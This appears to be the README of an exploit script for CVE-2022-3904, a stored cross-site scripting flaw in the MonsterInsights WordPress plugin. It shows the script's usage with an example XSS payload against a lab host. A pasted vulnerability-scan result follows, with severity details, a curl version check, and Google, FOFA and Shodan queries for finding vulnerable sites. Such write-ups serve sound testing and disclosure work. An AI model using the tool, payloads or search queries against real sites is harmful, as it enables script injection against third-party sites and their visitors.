# CVE-2022-3904
CVE-2022-3904 MonsterInsights &lt; 8.9.1 - Stored Cross-Site Scripting via Google Analytics

Usage
---

```
usage: CVE-2022-3904.py [-h] -u URL -p PAYLOAD

options:
  -h, --help            show this help message and exit
  -u URL, --url URL     URL of wordpress site to exploit
  -p PAYLOAD, --payload PAYLOAD
                        Payload to Execute ensure it's an xss
```

Example
---

```
python3 CVE-2022-3904.py -u http://wordpress.lan -p "<img src=x onerror=alert(document.domain)>"
```



### MonsterInsights <= 8.9.0 - Unauthenticated Stored Cross-Site Scripting via Google Analytics (CVE-2022-3904:version) found on https://wordpress.lan/

----
**Details**: **CVE-2022-3904:version** matched at http://wordpress.lan/

**Protocol**: HTTP

**Full URL**: http://wordpress.lan/wp-content/plugins/google-analytics-for-wordpress/readme.txt

**Timestamp**: Tue Jul 11 10:51:09 +0000 UTC 2023

**Template Information**

| Key | Value |
| --- | --- |
| Name | MonsterInsights <= 8.9.0 - Unauthenticated Stored Cross-Site Scripting via Google Analytics |
| Authors | random-robbie |
| Tags | cve, wordpress, wp-plugin, google-analytics-for-wordpress, medium |
| Severity | medium |
| Description | The MonsterInsights plugin for WordPress is vulnerable to Stored Cross-Site Scripting via post titles and pages in versions up to, and including, 8.9.0 due to insufficient input sanitization and output escaping on those values. This makes it possible for unauthenticated attackers to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page if they are able to successfully spoof a request to Google Analytics. |
| CVSS-Metrics | [CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:L/A:N](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:L/A:N) |
| CVE-ID | [CVE-2022-3904](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2022-3904) |
| CVSS-Score | 5.40 |
| fofa-query | wp-content/plugins/google-analytics-for-wordpress/ |
| google-query | inurl:"/wp-content/plugins/google-analytics-for-wordpress/" |
| shodan-query | vuln:CVE-2022-3904 |


References: 
- https://wpscan.com/vulnerability/244d9ef1-335c-4f65-94ad-27c0c633f6ad
- https://plugins.trac.wordpress.org/changeset?sfp_email=&sfph_mail=&reponame=&old=2797398%40google-analytics-for-wordpress&new=2797398%40google-analytics-for-wordpress&sfp_email=&sfph_mail=

**CURL command**
```sh
curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36' 'http://wordpress.lan/wp-content/plugins/google-analytics-for-wordpress/readme.txt'
```
